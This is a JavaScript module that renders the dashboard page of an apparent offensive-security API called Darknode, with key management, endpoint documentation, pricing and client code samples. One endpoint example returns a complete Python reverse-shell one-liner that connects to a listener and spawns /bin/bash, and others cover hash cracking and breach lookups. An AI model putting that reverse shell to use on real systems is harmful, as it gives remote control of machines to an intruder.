// Darknode API dashboard — key management, interactive docs, usage stats, code examples.
import { db } from "/js/firebase.js";
import { doc, getDoc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";

const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

function genKey() {
  const hex = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2, "0")).join("");
  return "sk-darknode-" + hex;
}

const ENDPOINTS = [
  { method: "POST", path: "/api/v1/scan/url", desc: "Scan a URL for vulnerabilities",
    reqBody: { url: "https://target.com", depth: 2 },
    resBody: { status: "complete", findings: [{ severity: "high", title: "SQL Injection", url: "https://target.com/login?id=1", detail: "Parameter 'id' is vulnerable to UNION-based SQLi" }] } },
  { method: "POST", path: "/api/v1/scan/code", desc: "Scan code for security issues",
    reqBody: { code: "app.get('/user', (req, res) => { db.query('SELECT * FROM users WHERE id=' + req.query.id) })", language: "javascript" },
    resBody: { status: "complete", findings: [{ severity: "critical", title: "SQL Injection", line: 1, detail: "User input concatenated into SQL query" }] } },
  { method: "POST", path: "/api/v1/osint/domain", desc: "OSINT lookup on a domain",
    reqBody: { domain: "example.com" },
    resBody: { domain: "example.com", ips: ["93.184.216.34"], subdomains: ["www", "mail", "api"], mx: ["mail.example.com"], technologies: ["nginx", "PHP"], registrar: "IANA" } },
  { method: "POST", path: "/api/v1/osint/email", desc: "Check email in breach databases",
    reqBody: { email: "user@example.com" },
    resBody: { email: "user@example.com", breached: true, breaches: [{ name: "ExampleBreach", date: "2023-01-15", records: 50000 }], pasteCount: 2 } },
  { method: "POST", path: "/api/v1/hash/crack", desc: "Identify and lookup a hash",
    reqBody: { hash: "5d41402abc4b2a76b9719d911017c592" },
    resBody: { hash: "5d41402abc4b2a76b9719d911017c592", type: "MD5", cracked: true, plaintext: "hello" } },
  { method: "POST", path: "/api/v1/encode", desc: "Encode or decode data",
    reqBody: { data: "hello world", operation: "encode", format: "base64" },
    resBody: { result: "aGVsbG8gd29ybGQ=", format: "base64", operation: "encode" } },
  { method: "POST", path: "/api/v1/generate/payload", desc: "Generate a reverse shell payload",
    reqBody: { type: "reverse-shell", language: "python", lhost: "10.10.14.1", lport: 4444 },
    resBody: { payload: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.1\",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn(\"/bin/bash\")'", language: "python", type: "reverse-shell" } },
  { method: "POST", path: "/api/v1/ai/ask", desc: "Ask the security AI a question",
    reqBody: { question: "How do I test for blind SQL injection?", context: "web application pentest" },
    resBody: { answer: "Blind SQLi can be detected using boolean-based or time-based techniques...", sources: ["OWASP Testing Guide", "PortSwigger Web Academy"] } },
];

const TIERS = [
  { name: "Free", price: "$0", calls: "100 / month", features: ["All endpoints", "Community support", "Rate limited"] },
  { name: "Pro", price: "$29", calls: "10,000 / month", features: ["All endpoints", "Priority support", "Higher rate limits", "Webhook notifications"] },
  { name: "Self-hosted", price: "Free", calls: "Unlimited", features: ["Run on your machine", "No rate limits", "Full privacy", "darknode api start"] },
];

export async function renderAPI(main, user) {
  // Load user's API key from Firestore
  let apiKey = "";
  let usage = { calls: 0, lastCall: null };
  try {
    const userDoc = await getDoc(doc(db, "users", user.uid));
    if (userDoc.exists()) {
      const d = userDoc.data();
      apiKey = d.apiKey || "";
      usage = d.apiUsage || { calls: 0, lastCall: null };
    }
  } catch (_) {}

  const masked = apiKey ? apiKey.slice(0, 14) + "*".repeat(20) : "";

  main.innerHTML = `
    <h1 class="pg-h1">Darknode API</h1>
    <p class="muted pg-sub">Integrate security scanning, OSINT, and AI into your workflow. Authenticate with your API key.</p>

    <div class="api-key-section">
      <div class="panel">
        <div class="panel-h"><h2 class="pg-h2" style="margin:0">Your API Key</h2></div>
        ${apiKey ? `
          <div class="api-key-row">
            <input class="api-key-input mono" id="apiKeyDisplay" type="password" value="${esc(apiKey)}" readonly>
            <button class="btn ghost sm" id="apiKeyReveal">Reveal</button>
            <button class="btn ghost sm" id="apiKeyCopy">Copy</button>
          </div>
          <div class="api-usage" style="margin-top:12px">
            <div class="set-row"><span class="muted">Calls this month</span><span>${usage.calls} / 100</span></div>
            <div class="api-meter"><div style="width:${Math.min(100, usage.calls)}%"></div></div>
            <div class="set-row"><span class="muted">Last call</span><span>${usage.lastCall ? new Date(usage.lastCall).toLocaleString() : "Never"}</span></div>
          </div>
          <button class="btn danger sm" id="apiKeyRegen" style="margin-top:10px">Regenerate key</button>
        ` : `
          <p class="muted" style="font-size:.85rem">Generate an API key to start using the Darknode API.</p>
          <button class="btn" id="apiKeyGen">Generate API Key</button>
        `}
        <p class="adm-msg" id="apiKeyMsg" style="margin-top:8px"></p>
      </div>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Quick Start</h2></div>
      <div class="api-code-block">
        <div class="api-code-header">curl</div>
        <button class="api-code-copy" data-copy="quickstart">Copy</button>
        <pre><code>curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: ${esc(apiKey || "YOUR_API_KEY")}" \\
  -d '{"url": "https://target.com"}'</code></pre>
      </div>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Endpoints</h2></div>
      <p class="muted" style="font-size:.82rem;margin:0 0 12px">All endpoints accept JSON and require the <code>X-API-Key</code> header.</p>
      <div id="apiEndpoints">
        ${ENDPOINTS.map((ep, i) => `
          <div class="api-endpoint" data-idx="${i}">
            <div class="api-ep-header">
              <span class="api-method api-method-post">POST</span>
              <span class="api-path mono">${esc(ep.path)}</span>
              <span class="api-ep-desc muted">${esc(ep.desc)}</span>
              <span class="api-ep-toggle">+</span>
            </div>
            <div class="api-ep-body" style="display:none">
              <div class="api-ep-section">
                <div class="api-ep-label">Request</div>
                <div class="api-code-block">
                  <div class="api-code-header">JSON body</div>
                  <pre><code>${esc(JSON.stringify(ep.reqBody, null, 2))}</code></pre>
                </div>
              </div>
              <div class="api-ep-section">
                <div class="api-ep-label">Response</div>
                <div class="api-code-block">
                  <div class="api-code-header">200 OK</div>
                  <pre><code>${esc(JSON.stringify(ep.resBody, null, 2))}</code></pre>
                </div>
              </div>
              <div class="api-ep-section">
                <div class="api-ep-label">curl</div>
                <div class="api-code-block">
                  <button class="api-code-copy" data-copy="curl-${i}">Copy</button>
                  <pre><code id="curl-${i}">curl -X POST https://darknode-api.onrender.com${esc(ep.path)} \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: ${esc(apiKey || "YOUR_API_KEY")}" \\
  -d '${JSON.stringify(ep.reqBody)}'</code></pre>
                </div>
              </div>
            </div>
          </div>
        `).join("")}
      </div>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Code Examples</h2></div>
      <div class="api-code-tabs">
        <button class="api-tab on" data-lang="curl">curl</button>
        <button class="api-tab" data-lang="python">Python</button>
        <button class="api-tab" data-lang="javascript">JavaScript</button>
        <button class="api-tab" data-lang="go">Go</button>
      </div>
      <div class="api-code-block" id="codeExampleBlock">
        <button class="api-code-copy" data-copy="codeExample">Copy</button>
        <pre><code id="codeExample">${esc(`curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: ${apiKey || "YOUR_API_KEY"}" \\
  -d '{"url": "https://target.com"}'`)}</code></pre>
      </div>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Pricing</h2></div>
      <div class="api-tiers">
        ${TIERS.map(tier => `
          <div class="api-tier ${tier.name === "Pro" ? "api-tier-highlight" : ""}">
            <h3>${esc(tier.name)}</h3>
            <div class="api-tier-price">${esc(tier.price)}</div>
            <div class="api-tier-calls">${esc(tier.calls)}</div>
            <ul>${tier.features.map(f => `<li>${esc(f)}</li>`).join("")}</ul>
          </div>
        `).join("")}
      </div>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Authentication</h2></div>
      <p style="font-size:.88rem;line-height:1.7">Include your API key in every request as an <code>X-API-Key</code> header:</p>
      <div class="api-code-block">
        <pre><code>X-API-Key: ${esc(apiKey || "sk-darknode-your-key-here")}</code></pre>
      </div>
      <p style="font-size:.85rem;line-height:1.7;margin-top:10px">
        Requests without a valid key return <code>401 Unauthorized</code>.
        Keys are scoped to your account and can be regenerated at any time.
        Keep your key secret — treat it like a password.
      </p>
    </div>

    <div class="panel" style="margin-top:16px">
      <div class="panel-h"><h2 class="pg-h2" style="margin:0">Self-Hosted Mode</h2></div>
      <p style="font-size:.88rem;line-height:1.7">Run the API on your own machine for unlimited, private access. No data leaves your network.</p>
      <div class="api-code-block">
        <div class="api-code-header">bash</div>
        <pre><code># Install the Darknode CLI
curl -fsSL https://darknode.sh/install | sh

# Start the API server locally
darknode api start --port 8080

# Now use localhost instead of the cloud endpoint
curl -X POST http://localhost:8080/api/v1/scan/url \\
  -H "Content-Type: application/json" \\
  -d '{"url": "https://target.com"}'</code></pre>
      </div>
    </div>
  `;

  const $ = (id) => main.querySelector(id);

  // Key management
  const genBtn = $("#apiKeyGen");
  if (genBtn) genBtn.onclick = async () => {
    const key = genKey();
    try {
      await setDoc(doc(db, "users", user.uid), { apiKey: key, apiUsage: { calls: 0, lastCall: null }, apiKeyCreated: serverTimestamp() }, { merge: true });
      renderAPI(main, user);
    } catch (e) {
      const msg = $("#apiKeyMsg"); if (msg) msg.textContent = "Failed: " + e.message;
    }
  };

  const regenBtn = $("#apiKeyRegen");
  if (regenBtn) regenBtn.onclick = async () => {
    if (!confirm("Regenerate your API key? The old key will stop working immediately.")) return;
    const key = genKey();
    try {
      await setDoc(doc(db, "users", user.uid), { apiKey: key, apiUsage: { calls: 0, lastCall: null }, apiKeyCreated: serverTimestamp() }, { merge: true });
      renderAPI(main, user);
    } catch (e) {
      const msg = $("#apiKeyMsg"); if (msg) msg.textContent = "Failed: " + e.message;
    }
  };

  const revealBtn = $("#apiKeyReveal");
  if (revealBtn) revealBtn.onclick = () => {
    const inp = $("#apiKeyDisplay");
    if (!inp) return;
    if (inp.type === "password") { inp.type = "text"; revealBtn.textContent = "Hide"; }
    else { inp.type = "password"; revealBtn.textContent = "Reveal"; }
  };

  const copyBtn = $("#apiKeyCopy");
  if (copyBtn) copyBtn.onclick = () => {
    navigator.clipboard?.writeText(apiKey);
    copyBtn.textContent = "Copied!";
    setTimeout(() => { copyBtn.textContent = "Copy"; }, 1200);
  };

  // Endpoint toggles
  main.querySelectorAll(".api-endpoint").forEach(ep => {
    const header = ep.querySelector(".api-ep-header");
    const body = ep.querySelector(".api-ep-body");
    const toggle = ep.querySelector(".api-ep-toggle");
    if (header && body) header.onclick = () => {
      const open = body.style.display !== "none";
      body.style.display = open ? "none" : "block";
      if (toggle) toggle.textContent = open ? "+" : "-";
    };
  });

  // Code copy buttons
  main.querySelectorAll(".api-code-copy").forEach(btn => {
    btn.onclick = (e) => {
      e.stopPropagation();
      const targetId = btn.dataset.copy;
      const el = main.querySelector("#" + targetId) || btn.parentElement.querySelector("code");
      if (el) {
        navigator.clipboard?.writeText(el.textContent);
        btn.textContent = "Copied!";
        setTimeout(() => { btn.textContent = "Copy"; }, 1200);
      }
    };
  });

  // Language tabs
  const CODE_EXAMPLES = {
    curl: `curl -X POST https://darknode-api.onrender.com/api/v1/scan/url \\
  -H "Content-Type: application/json" \\
  -H "X-API-Key: ${apiKey || "YOUR_API_KEY"}" \\
  -d '{"url": "https://target.com"}'`,

    python: `import requests

response = requests.post(
    "https://darknode-api.onrender.com/api/v1/scan/url",
    headers={
        "Content-Type": "application/json",
        "X-API-Key": "${apiKey || "YOUR_API_KEY"}"
    },
    json={"url": "https://target.com"}
)

findings = response.json()["findings"]
for f in findings:
    print(f"{f['severity']}: {f['title']} - {f['detail']}")`,

    javascript: `const response = await fetch(
  "https://darknode-api.onrender.com/api/v1/scan/url",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-API-Key": "${apiKey || "YOUR_API_KEY"}"
    },
    body: JSON.stringify({ url: "https://target.com" })
  }
);

const { findings } = await response.json();
findings.forEach(f =>
  console.log(\`\${f.severity}: \${f.title} - \${f.detail}\`)
);`,

    go: `package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
)

func main() {
    body, _ := json.Marshal(map[string]string{"url": "https://target.com"})
    req, _ := http.NewRequest("POST",
        "https://darknode-api.onrender.com/api/v1/scan/url",
        bytes.NewBuffer(body))
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-API-Key", "${apiKey || "YOUR_API_KEY"}")

    resp, err := http.DefaultClient.Do(req)
    if err != nil { panic(err) }
    defer resp.Body.Close()

    var result map[string]interface{}
    json.NewDecoder(resp.Body).Decode(&result)
    fmt.Println(result)
}`,
  };

  main.querySelectorAll(".api-tab").forEach(tab => {
    tab.onclick = () => {
      main.querySelectorAll(".api-tab").forEach(t => t.classList.remove("on"));
      tab.classList.add("on");
      const code = $("#codeExample");
      if (code) code.textContent = CODE_EXAMPLES[tab.dataset.lang] || "";
    };
  });
}
